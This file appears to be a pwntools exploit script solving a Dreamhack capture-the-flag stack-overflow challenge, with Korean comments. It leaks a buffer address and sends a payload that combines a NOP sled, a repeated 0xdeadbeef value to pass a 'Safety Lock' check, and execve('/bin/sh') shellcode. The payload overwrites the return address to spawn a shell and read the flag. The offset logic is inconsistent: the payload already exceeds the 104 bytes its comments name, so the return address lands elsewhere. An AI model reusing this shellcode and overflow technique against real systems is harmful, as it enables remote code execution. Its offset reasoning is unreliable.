from pwn import *

# 디버깅 설정
context.log_level = 'debug'
context.arch = 'amd64'

host = 'host8.dreamhack.games'
port = 11226

def main():
    p = remote(host, port)
    
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", b"8731")
    
    p.recvuntil(b"RAM_DISK @ ")
    leak_addr = int(p.recvline().strip(), 16)
    log.success(f"Leaked Buffer Start: {hex(leak_addr)}")

    # ================================================================
    # [전략 수정] 정확한 오프셋을 찾기 어려울 때는 
    # Safety Lock 값을 여러 번 반복해서 보내는 것이 가장 확실합니다.
    # ================================================================
    
    # 1. 쉘코드 (약 23바이트)
    shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    
    # 2. 페이로드 구성
    # 버퍼 시작부터 넉넉하게 80바이트 정도를 채웁니다.
    # local_c가 어느 위치(대략 60~76바이트 사이)에 있든 0xdeadbeef가 걸리도록 합니다.
    payload = b""
    payload += b"\x90" * 40              # 초기 NOP 슬레드
    payload += p32(0xdeadbeef) * 12      # Safety Lock 후보군 (40~88바이트 영역 커버)
    payload += b"\x90" * 10              # 추가 패딩
    payload += shellcode                 # 쉘코드 안착
    
    # 3. 리턴 주소 덮어쓰기
    # 앞에서 이미 100바이트 이상 채웠으므로, 릭 주소 기준 약 104바이트 지점이 RET 위치입니다.
    payload = payload.ljust(104, b"A")
    
    # 리턴 주소를 버퍼 시작점(leak_addr)으로 설정 
    # (앞부분에 NOP 슬레드가 있으므로 시작점으로 뛰어도 안전합니다)
    payload += p64(leak_addr)

    log.info(f"Final Payload Size: {len(payload)}")
    
    # 4. 전송
    p.sendlineafter(b"> ", payload)
    
    # 5. 확인
    try:
        # Rebooting 메시지가 나오면 성공!
        p.recvuntil(b"Rebooting...\n")
        log.success("!!! EXPLOIT SUCCESS !!!")
        p.sendline(b"id")
        p.sendline(b"cat flag")
        p.interactive()
    except EOFError:
        log.error("Safety Lock 우회 실패 또는 Crash 발생. 오프셋 재조정 필요.")

if __name__ == "__main__":
    main()